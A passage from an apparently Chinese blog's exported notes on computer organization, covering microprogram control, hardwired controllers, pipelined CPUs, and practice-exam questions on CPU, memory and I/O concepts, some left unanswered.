class="line">把相斥性的微命令分在同一段内，相容性的微命令分在不同段内。这样不仅有助于提高信息的利用率，缩短微指令字长，而且有助于充分利用硬件所具有的并行性，加快执行的速度。 </span><br><span class="line">应与数据通路结构相适应。</span><br><span class="line">每个小段中包含的信息位不能太多，否则将增加译码线路的复杂性和译码时间。</span><br><span class="line">一般每个小段还要留出一个状态，表示本字段不发出任何微命令。</span><br></pre></td></tr></table></figure><ol start="3"><li>混合表示法</li></ol><h4 id="微地址的形成方法"><a href="#微地址的形成方法" class="headerlink" title="微地址的形成方法"></a>微地址的形成方法</h4><ol><li>计数器方式<br>微程序顺序执行时，其后继微地址就是现行微地址加上一个增量（通常为1）；<br>当微程序遇到转移或转子程序时，由微指令的转移地址段来形成转移微地址。<br>在微程序控制器中也有一个微程序计数器uPC，一般情况下都是将微地址寄存器uMAR作为uPC。<br><code>优点</code>：简单、易于掌握，编制微程序容易。<br><code>缺点</code>：这种方式不能实现两路以上的并行微程序转移，因而不利于提高微程序的执行速度，灵活性较差。</li><li>多路转移方式<br>一条微指令具有多个转移分支的能力。当微程序出现分支时，按顺序控制字段的“判别测试”标志和“状态条件”信息来选择后继微地址。<br><code>特点</code>：能以较短的顺序控制字段配合，实现多路并行转移，灵活性好，速度较快，但转移地址逻辑需要用组合逻辑方法设计</li></ol><h4 id="微指令格式"><a href="#微指令格式" class="headerlink" title="微指令格式"></a>微指令格式</h4><p>微指令的编译方法是决定微指令格式的主要因素，可以分成两类：<code>水平型微指令</code>和<code>垂直型微指令</code></p><ol><li>水平型微指令<br>一次能定义并能并行执行多个微命令的微指令。<br><code>优点</code>： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">微指令字较长，速度越快； </span><br><span class="line">微指令中的微操作有高度的并行性； </span><br><span class="line">微指令译码简单；</span><br><span class="line">控制存储器的纵向容量小，灵活性强。</span><br></pre></td></tr></table></figure><code>缺点</code>： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">微指令字比较长，明显地增加了控制存储器的横向容量； </span><br><span class="line">水平微指令与机器指令差别很大，一般要熟悉机器结构、数据通路、时序系统以及指令执行过程的人才能进行微程序设计，对用户来说很困难</span><br></pre></td></tr></table></figure></li><li>垂直型微指令<br>类似于机器指令的结构，有操作码，一次只能执行1或2个微命令的微指令。<br><code>优点</code>： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">微指令字短，一般为10～20位左右；</span><br><span class="line">微指令的并行微操作能力有限，一般只包含1个微操作命令；</span><br><span class="line">微指令译码比较复杂，全部微命令用一个微操作控制字段进行编码，微指令执行时需完全译码； </span><br><span class="line">设计用户只需注意微指令的功能，而对微命令及其选择、数据通路的结构则不用过多地考虑，因此，便于用户编制微程序。而且，编制的微程序规整、直观，便于实现设计的自动化；</span><br><span class="line">垂直微指令字较短，使控制存储器的横向容量少。</span><br></pre></td></tr></table></figure><code>缺点</code>：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用垂直微指令编制微程序要使用较多的微指令，微程序较长；</span><br><span class="line">要求控制存储器的纵向容量大；</span><br><span class="line">垂直微指令产生微命令要经过译码，微程序执行速度慢； </span><br><span class="line">不能充分利用数据通路具有多种并行操作能力。</span><br></pre></td></tr></table></figure></li><li>水平型微指令和垂直型微指令的<code>比较</code><br>水平型微指令并行操作能力强，效率高，灵活性强，垂直型微指令则较差。<br>水平型微指令执行一条指令的时间短，垂直型微指令执行时间长。<br>由水平型微指令解释指令的微程序，有微指令字较长而微程序短的特点。垂直型微指令则相反。<br>水平型微指令用户难以掌握，而垂直型微指令与指令比较相似，相对来说，比较容易掌握。</li></ol><h4 id="动态微程序设计"><a href="#动态微程序设计" class="headerlink" title="动态微程序设计"></a>动态微程序设计</h4><p><code>静态微程序设计</code>：对应于一台计算机的机器指令只有一组微程序，这一组微程序设计好之后，一般无须改变而且也不好改变。 </p><p><code>动态微程序设计</code>：采用E2PROM作为控制存储器，可以通过改变微指令和微程序来改变机器的指令系统。<br>微指令和微程序可以根据需要加以改变，因而可以在一台机器上实现不同类型的指令系统，又称为<code>仿真其他机器指令系统</code>，以便扩大机器的功能</p><h2 id="硬连线（硬布线）控制器"><a href="#硬连线（硬布线）控制器" class="headerlink" title="硬连线（硬布线）控制器"></a>硬连线（硬布线）控制器</h2><p>通过逻辑电路直接连线而生成的控制器，又称为<code>组合逻辑控制器</code>。<br><code>设计目标</code>：使用最少元件（复杂的树形网络），速度最高。<br><code>微操作控制信号产生</code>：<br>在微程序控制器中，微操作控制信号由微指令产生，并且可以重复使用。<br>在硬布线控制器中，某一微操作控制信号由布尔代数表达式描述的输出函数产生。<br><code>设计微操作控制信号的方法和过程</code>：根据所有机器指令流程图，寻找出产生同一个微操作信号的所有条件，并与适当的节拍电位和节拍脉冲组合，从而写出其布尔代数表达式并进行简化，然后用门电路或可编程器件来实现</p><p><strong>设计步骤</strong>：</p><ol><li>画出指令流程图</li><li>列出微操作时间表<br>微操作时间表形象地表明：什么时间、根据什么条件发出哪些微操作信号。将指令流程图中的微操作合理地安排到各个机器周期的相应节拍和脉冲中去。</li><li>进行微操作信号的综合<br>当列出所有指令的微操作时间表之后，需要对它们进行综合分析，把凡是要执行某一微操作的所有条件（哪条指令、哪个机器周期、哪个节拍和脉冲等）都考虑在内，加以分类组合，列出各微操作产生的逻辑表达式，然后加以简化，使逻辑表达式更为合理。 </li><li>实现电路<br>根据整理并化简的逻辑表达式组，可以用一系列组合逻辑电路加以实现，如逻辑门电路的组合、PLA或其他逻辑电路。</li></ol><h2 id="流水CPU"><a href="#流水CPU" class="headerlink" title="流水CPU"></a>流水CPU</h2><h3 id="并行处理技术"><a href="#并行处理技术" class="headerlink" title="并行处理技术"></a>并行处理技术</h3><h4 id="并行处理技术-1"><a href="#并行处理技术-1" class="headerlink" title="并行处理技术"></a>并行处理技术</h4><ol><li>时间并行<br>即时间重叠，在并行性概念中引入时间因素，让多个处理过程在时间上相互错开，轮流重叠地使用同一套硬件设备的各个部分，以<code>加快硬件周转而赢得速度</code>。</li><li>空间并行<br>指资源重复，在并行性概念中引入空间因素，<code>以“数量取胜”</code>为原则来<code>大幅度提高计算机的处理速度</code>。<br>大规模和超大规模集成电路的迅速发展为空间并行技术带来了巨大生机，因而成为目前实行并行处理的一个主要途径，主要体现在多处理器系统和多计算机系统。</li><li>时间并行+空间并行<br>时间重叠与资源重复的综合应用，采用时间并行性及空间并行性。<br>例如奔腾CPU采用了超标量流水技术，在一个机器周期中同时执行两条指令，因而既具有时间并行性，又具有空间并行性</li></ol><h4 id="流水线原理"><a href="#流水线原理" class="headerlink" title="流水线原理"></a>流水线原理</h4><p>从本质上讲，<code>流水线技术是一种时间并行技术。</code><br>在流水线中，<code>原则上要求各个阶段的处理时间都相同</code></p><h3 id="流水CPU的结构"><a href="#流水CPU的结构" class="headerlink" title="流水CPU的结构"></a>流水CPU的结构</h3><h4 id="流水计算机的系统组成"><a href="#流水计算机的系统组成" class="headerlink" title="流水计算机的系统组成"></a>流水计算机的系统组成</h4><p>CPU按流水线方式组织，通常由三大部分组成：指令部件、指令队列、执行部件。这三个功能部件可以组成一个3级流水线。</p><p>程序和数据存储在主存中，主存采用多体交叉存储器，以提高速度。Cache弥补主存和CPU速度上的差异</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E6%B5%81%E6%B0%B4%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%BB%84%E6%88%90.png" class=""><p>指令部件本身构成一个流水线，即指令流水线，由取指令、指令译码、计算操作数地址、取操作数等几个过程段组成。</p><p>指令队列是一个先进先出（FIFO）的寄存器栈，用于存放经过译码的指令和取来的操作数，也是由若干个过程组成的流水线。</p><p>执行部件可以具有多个算术逻辑运算部件，部件本身用流水线方式构成。</p><p>当执行部件正在执行第I条指令时，指令队列中存放着I+1，I+2，…，I+k条指令，与此同时，指令部件正在取第I+k+1条指令</p><p>执行段的速度匹配问题，通常采用并行的运算部件以及部件流水线的工作方式来解决：</p><ol><li>将执行部件分为定点执行部件和浮点执行部件两个可并行执行的部分，分别处理定点运算指令和浮点运算指令；</li><li>在浮点执行部件中，又有浮点加法部件和浮点乘除部件，可以同时执行不同的指令；</li><li>浮点运行部件都以流水线方式工作。</li></ol><h4 id="流水CPU的时空图"><a href="#流水CPU的时空图" class="headerlink" title="流水CPU的时空图"></a>流水CPU的时空图</h4><p>假设一个指令周期包含四个子过程：取指令IF、指令译码ID、执行运算EX、结果写回WB，各个过程段之间设有高速缓冲寄存器，以暂时保存上一过程段子任务处理的结果。</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E6%B5%81%E6%B0%B4CPU%E7%9A%84%E6%97%B6%E7%A9%BA%E5%9B%BE.png" class=""><p>如果流水计算机具有两条以上的指令流水线，称为<code>超标量流水计算机</code></p><h4 id="流水线分类"><a href="#流水线分类" class="headerlink" title="流水线分类"></a>流水线分类</h4><p>一个计算机系统可以在不同的<code>并行等级</code>上采用流水线技术，常用的流水线形式有：</p><ol><li><code>指令流水线</code>：指令步骤的并行。</li><li><code>算术流水线</code>：运算操作步骤的并行，如流水加法器、流水乘法器等。</li><li><code>处理机流水线</code>：也称为<code>宏流水线</code>，是程序步骤的并行。由一串级联的处理机构成流水线的各个过程段，每台处理机负责某一特定任务。</li></ol><h3 id="流水线中的主要问题"><a href="#流水线中的主要问题" class="headerlink" title="流水线中的主要问题"></a>流水线中的主要问题</h3><ol><li>资源相关<br>指多条指令进入流水线后在同一机器时钟周期内争用同一个功能部件所发生的冲突</li><li>数据相关<br>在一个程序中，如果必须等前一条指令执行完毕后，才能执行后一条指令，那么这两条指令就是数据相关的</li><li>控制相关<br>控制相关冲突是由转移指令引起的。<br>当执行转移指令时，依据转移条件的产生结果，可能为顺序取下条指令；也可能转移到新的目标地址取指令，从而使流水线发生断流。</li></ol><p>为了减小转移指令对流水线性能的影响，常用以下两种转移处理技术：<br><code>延迟转移法</code><br>由编译程序重排指令序列来实现。<br>基本思想是“先执行后转移”，即发生转移取指时并不排空指令流水线，而是让紧跟在转移指令Ib之后已进入流水线的少数几条指令继续完成。<br>如果这些指令是与Ib结果无关的有用指令，那么延迟损失时间片正好得到了有效的利用。</p><p><code>转移预测法</code><br>硬件方法实现，依据指令过去的行为来预测将来的行为。<br>通过使用转移取指和顺序取指两路指令预取队列器以及指令cache，可将转移预测提前到取指阶段进行，以获得良好的效果。</p><h1 id="刷题遇到的问题"><a href="#刷题遇到的问题" class="headerlink" title="刷题遇到的问题"></a>刷题遇到的问题</h1><h2 id="试卷一"><a href="#试卷一" class="headerlink" title="试卷一"></a>试卷一</h2><h3 id="填空选择"><a href="#填空选择" class="headerlink" title="填空选择"></a>填空选择</h3><ol><li>双符号位二进制数<br>00表示正数；11表示负数；01正溢；10负溢</li><li>指令寄存器的作用是保存当前正在执行的指令</li><li>变址寻址方式中，操作数的有效地址等于变址寄存器内容加上形式地址</li><li>由于CPU内部的操作速度较快，二CPU访问一次主存所花实践较长，因此机器周期通常用主存中读取一个数据字的最长实践来规定</li><li>当采用统一编址法对设备进行编址情况下，不需要专门的I/O指令组</li><li>设计控制单元时，主要采用组合逻辑设计和微程序设计两种方法</li><li>按照系统总线传输信息的不同，可以分成数据总线、地址总线、控制总线</li><li>cache是一种高速缓冲存储器，是为了解决CPU和内存之间速度上不匹配而采用的一项重要硬件技术</li></ol><h3 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h3><ol><li>简要说明CPU与I/O之间传递信息可以采用哪几种联络方式？它们分别用于什么场合？</li></ol><ul><li>三种：立即响应、同步、异步</li><li>立即响应：工作速度十分缓慢的I/O设备</li><li>异步：I/O设备与主机工作速度不匹配</li><li>同步：I/O设备与CPU工作速度完全同步</li></ul><ol start="2"><li>什么是指令周期、机器周期和时钟周期？三者何关系？</li></ol><ul><li>时钟周期是控制计算机操作的最小单位时间</li><li>机器周期是所有指令执行过程中的一个基准时间</li><li>指令周期是去除并执行一条指令所需要的时间</li><li>一条指令周期包含若干机器周期，一个机器周期包含若干个时钟周期</li></ul><ol start="3"><li>除了采用高速芯片外，从计算机的各个子系统的角度分析，写出6种提高整机速度的措施</li></ol><ul><li>针对存储器，可以采用cache-主存层次的设计和管理提高整机的速度</li><li>针对存储器，可以采用主存-赋存层次设计和管理提高整机的速度</li><li>针对存储器，可以采用多体并行设计方法提高访问速度</li><li>针对控制器，可以通过指令流水提高整机的速度</li><li>针对控制器，可以通过超标量设计和技术提高整机的速度</li><li>针对运算器，可以对运算方法加一改进，如进位链、两位乘除法</li><li>针对I/O系统，可以运用DMA技术来减少CPU对外设访问的干预</li><li>采用多总线技术</li></ul><h3 id="计算题"><a href="#计算题" class="headerlink" title="计算题"></a>计算题</h3><h2 id="试卷二"><a href="#试卷二" class="headerlink" title="试卷二"></a>试卷二</h2><h3 id="填空选择-1"><a href="#填空选择-1" class="headerlink" title="填空选择"></a>填空选择</h3><ol><li>在CPU中，记录下一条指令地址的寄存器是程序计数器</li><li>若浮点数用补码表示，则判断运算结果是否位规格化数的方法是数符与尾数小数点后第一位数字相异为规格化数</li><li>在原码一位乘法的计算过程中，如果数值部分的长度为n，那么最多需要进行n次加法和n次移位操作</li><li>在指令的地址字段中，直接指出操作数本身的寻址方式称为立即寻址</li><li>冯诺依曼最早提出：不管怎样更新，计算机依然保有“存储程序”的概念</li><li>发生中断请求的条件之一是一条指令执行结束</li><li>指令和数据均以二进制形式存储</li><li>采用DMA方式传输数据时，每传送一个数据要占用一个存取周期的时间</li><li>cache是一种高速缓冲存储器，是为了解决CPU和内存之间速度上不匹配而采用的一项重要硬件技术</li><li>影响流水线性能的因素主要反映在结构相关、数据相关、控制相关三个方面</li><li>设计控制单元时，主要采用组合逻辑设计和微程序设计</li><li>指令周期一般包括四个周期，分别为取指周期、间址周期、执行周期、中断周期</li><li>指令字长是指一条指令的长度，操作码和数据地址码位数之和</li><li>存储字长是指计算机CPU能直接处理的二进制数据的位数，与CPU的寄存器位数相关</li><li>机器字长是指一个存储单元可以存储的遗传二进制代码的位数</li></ol><h3 id="简答题-1"><a href="#简答题-1" class="headerlink" title="简答题"></a>简答题</h3><ol><li>简述存取周期与存取时间的概念</li></ol><ul><li>存取时间又称存储器的访问时间，是指启动一次存储器操作(读或写)到完成该操作所需的全部时间</li><li>存取周期是指存储器进行连续两次独立的存储器操作(如连续两次读操作)所需的最小间隔时间</li></ul><ol start="2"><li>通常DMA与主存交换数据时采用哪几种方法？</li></ol><ul><li>停止CPU访问主存</li><li>周期挪用(或周期窃取)</li><li>DMA与CPU交替访问</li></ul><h3 id="计算题-1"><a href="#计算题-1" class="headerlink" title="计算题"></a>计算题</h3><h2 id="试卷三"><a href="#试卷三" class="headerlink" title="试卷三"></a>试卷三</h2><h3 id="填空选择-2"><a href="#填空选择-2" class="headerlink" title="填空选择"></a>填空选择</h3><ol><li>若浮点数用补码表示，则判断运算结果是否为规格化数的方法是：</li><li>机器字长是指：</li><li>控制器中，具有自动加1功能的部件是：</li><li>主存储器和CPU之间增加cache的目的是：</li><li>寄存器间接寻址方式中，操作数处在：</li><li>按照系统总线传输信息的不同，总线可以分为三类：<br>控制总线、地址总线、数据总线</li><li>发生中断请求的条件之一是：</li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 硬件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
